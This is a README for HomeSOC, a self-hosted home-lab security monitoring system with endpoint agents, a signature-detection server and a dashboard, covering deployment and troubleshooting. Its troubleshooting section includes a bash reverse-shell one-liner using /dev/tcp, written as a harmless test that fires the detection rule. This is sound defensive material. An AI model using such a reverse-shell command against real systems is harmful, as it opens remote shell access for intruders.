<div align="center">

# HomeSOC

**A self-hosted SOC for your home lab.** Lightweight agents on each Linux /
Windows / macOS host stream process, file, network, and auth telemetry to a
server that runs signature detection and surfaces alerts in a dark, terminal-
styled console.

![status](https://img.shields.io/badge/status-v1-00ff9c)
![python](https://img.shields.io/badge/python-3.12-1d9e75)
![deploy](https://img.shields.io/badge/deploy-docker%20compose-0db7ed)
![license](https://img.shields.io/badge/license-MIT-blue)

</div>

## What it does

- Centralizes endpoint telemetry from a small fleet into one dashboard.
- Detects suspicious activity with a tuned set of high-signal rules across all
  four telemetry types, plus custom rules you author (and test) right in the dashboard.
- Opens every alert to its full story: the rule that fired, the triggering
  event, a reconstructed process tree, and a ±5-minute timeline.
- Optionally adds Claude behavioral analysis on an alert you choose (bring your
  own API key; the engine runs fine without it).

A standalone, click-through preview is included as `homesoc-demo.html` — open it
in any browser to explore the UI without deploying anything.

<img width="1057" height="632" alt="image" src="https://github.com/user-attachments/assets/4d10345e-e380-417e-9eee-630e459c6f13" />

## How it works

```
┌─────────────┐  process/file/network/auth   ┌──────────────────────────────┐
│   agent     │ ───── HTTP + enroll key ────▶ │            server            │
│ (per host)  │      batched events           │   FastAPI · SQLite · engine  │
└─────────────┘                               │                              │
                                              │  per-event signature match   │
┌─────────────┐    browser (HTTP)             │       │ alerts                │
│  analyst    │ ◀───────────────────────────  │       ▼  dashboard + JSON API │
└─────────────┘                               └──────────────┬───────────────┘
                                                  opt-in,     ▼
                                                  per alert   Anthropic API (HTTPS)
```

**Server** (`server/app`) — a FastAPI app with two faces:

- *Ingestion*: agents `POST /api/events` (gated by a shared bearer key). Each
  event is written to SQLite (WAL) and run through an in-memory **signature
  engine** that matches it against the loaded rules; matches become alerts.
- *Dashboard API*: the static single-page console reads `/api/devices`,
  `/api/alerts`, and `/api/rules`, and drives triage and rule CRUD. Enabling
  Claude adds `POST /api/alerts/{id}/analyze`, the only outbound call.

**Detection** (`server/app/detection.py`) — stateless, per-event matching.
Rules are compact YAML: built-ins live in `server/rules/*.yml` (hot-reloadable),
and custom rules authored in the dashboard are stored in SQLite and merged into
live matching immediately, each with an on/off toggle. The matcher uses a fixed
operator set (equality, membership, substring, regex, numeric, and CIDR-aware IP
helpers), so rules are data, never executed code.

**Agent** (`agent/homesoc_agent.py`) — four collector threads (process, file,
network, auth) feed a queue; a shipper batches events to the server over HTTP and
sends heartbeats when idle. It's userland and polling-based: it samples the
process and socket tables on an interval and degrades gracefully when it lacks
privileges.

**Storage** — SQLite, a single file in a Docker volume. Swap for ClickHouse at
scale; the app talks to a thin helper layer, not raw SQL.

## Deploy — server

Any Linux host with Docker (or macOS with Docker Desktop).

```bash
./deploy.sh
```

`deploy.sh` checks for Docker + the compose plugin, installs Docker on Linux if
missing (downloads Docker's official script and prompts first — `--yes` to skip),
opens the dashboard port in `ufw`/`firewalld`/`iptables`, generates a strong
enroll key if you haven't set one, builds and starts the stack, then prints the
dashboard URL and the key.

```
Options: --key KEY   --port PORT   --yes   --no-build   --no-firewall
```

Manual equivalent:

```bash
export HOMESOC_ENROLL_KEY="your-strong-key"   # read by docker-compose.yml
docker compose up -d --build
# open http://<server-ip>:8080
```

The dashboard is empty until an agent enrolls.

## Deploy — agents (clients)

Install on each endpoint and point it at the server with the enroll key. The
installer normalizes the URL, **verifies it can reach the server and that the key
is accepted** (printing `LIVE` or the exact reason it isn't), and — with the
service flag — registers a background service so the agent keeps running and
auto-starts on boot. Use the service flag unless you only want a quick test;
without it the agent isn't left running.

**Linux / macOS**

```bash
cd agent
sudo ./install.sh --server http://<server-ip>:8080 --key <enroll-key> --service
```

`--service` installs a systemd unit (Linux) or launchd job (macOS) and starts it.

**Windows** (run in an elevated PowerShell)

```powershell
cd agent
.\install.ps1 -Server "http://<server-ip>:8080" -Key "<enroll-key>" -Service
```

`-Service` registers and starts a Scheduled Task running as SYSTEM.

Run with root / SYSTEM for full process, socket, and auth-log visibility. A bare
host/IP is accepted (the installer adds `http://`), but include the port if the
server isn't on 80 — e.g. `http://192.168.1.10:8080`. On success the host appears
in the dashboard fleet within ~30 seconds.

> **Security:** v1 targets a trusted LAN — agent transport is plain HTTP with a
> shared key, and the dashboard has no authentication. Don't expose it directly
> to an untrusted network; put it behind a reverse proxy with auth + TLS, or bind
> it to localhost.

## Troubleshooting

Real issues that come up during setup, with the commands to resolve them.

**The server is still using `changeme` after I set a key.**
The key is frozen into the container at creation time, so you must *recreate* it
(a plain `restart` reuses the old container). From the folder with
`docker-compose.yml`:
```bash
docker compose config | grep HOMESOC_ENROLL_KEY    # what Compose will use (from .env)
docker compose up -d --force-recreate
docker compose exec homesoc-server printenv HOMESOC_ENROLL_KEY   # what the container has now
```
`deploy.sh` writes the key to `.env`, which Compose reads automatically — prefer
that over `export`, which only lives in the current shell.

**`echo $HOMESOC_ENROLL_KEY` prints nothing (or you're on Windows).**
`export` only affects the shell you ran it in, and PowerShell doesn't use
`export`/`$VAR` at all (it's `$env:VAR`). Don't fight it — let `deploy.sh`
generate and save the key to `.env`, or put `HOMESOC_ENROLL_KEY=<key>` in `.env`
yourself, then `docker compose up -d --force-recreate`.

**Agent error: `Invalid URL '<ip>/api/enroll': No schema supplied`.**
The server URL is missing its scheme/port. It must be a full URL:
```yaml
# agent/config.yaml
server: "http://192.168.1.10:8080"
```
The installer now adds `http://` automatically, but include the port if the
server isn't on 80.

**Agent log shows `401 bad enroll key` (or the installer says key rejected).**
The agent's key doesn't match the server's active key. Compare and fix:
```bash
# server:
docker compose exec homesoc-server printenv HOMESOC_ENROLL_KEY
```
```yaml
# agent/config.yaml  -> make enroll_key identical, byte-for-byte
enroll_key: "….same value…."
```

**Verify an agent can reach the server and the key works** (no guessing):
```bash
# from the agent folder:
.venv/bin/python homesoc_agent.py --config config.yaml --check        # Linux/macOS
```
```powershell
.\.venv\Scripts\python.exe .\homesoc_agent.py --config .\config.yaml --check   # Windows
```
It prints `LIVE …`, `NOT LIVE: enroll key rejected …`, or `NOT LIVE: cannot
reach …`. To test raw connectivity only:
```powershell
Test-NetConnection 192.168.1.10 -Port 8080        # Windows  (TcpTestSucceeded: True)
```
```bash
nc -vz 192.168.1.10 8080                          # Linux/macOS
```

**Windows scheduled task is stuck in `Ready` / agent exits immediately / no devices show.**
`Ready` means the process started and exited — run it in the foreground (as
SYSTEM there's no visible output) to see why:
```powershell
& "C:\path\to\agent\.venv\Scripts\python.exe" "C:\path\to\agent\homesoc_agent.py" --config "C:\path\to\agent\config.yaml"
```
The output is the answer: `enrolled as …` (working — re-run `Start-ScheduledTask -TaskName "HomeSOC Agent"`),
`401 …` (key mismatch), or a `Traceback` (config error — usually a malformed
`server:` line). The scheduled task is registered at the root path (`\`), which
is normal.

**Trigger a test alert** to confirm the pipeline end-to-end (run on a host with a
running agent; give it ~10s, then refresh the dashboard):
```bash
# Linux — fires the critical reverse-shell rule (connection fails instantly; harmless)
timeout 2 bash -c 'bash -i >& /dev/tcp/8.8.8.8/4444 0>&1' 2>/dev/null; true
```
```powershell
# Windows — fires the recon rule
whoami /all
```

**Useful operations.**
```bash
docker compose logs -f homesoc-server                 # server logs
docker compose ps                                     # container status
journalctl -u homesoc-agent -f                        # Linux agent service logs
Get-ScheduledTaskInfo -TaskName "HomeSOC Agent"       # Windows agent task status
```
Data persists in the `homesoc-data` volume, so recreating the container keeps
your alerts. Note: marking an alert **resolved deletes it** from the dashboard.

## License

MIT — see `LICENSE`.
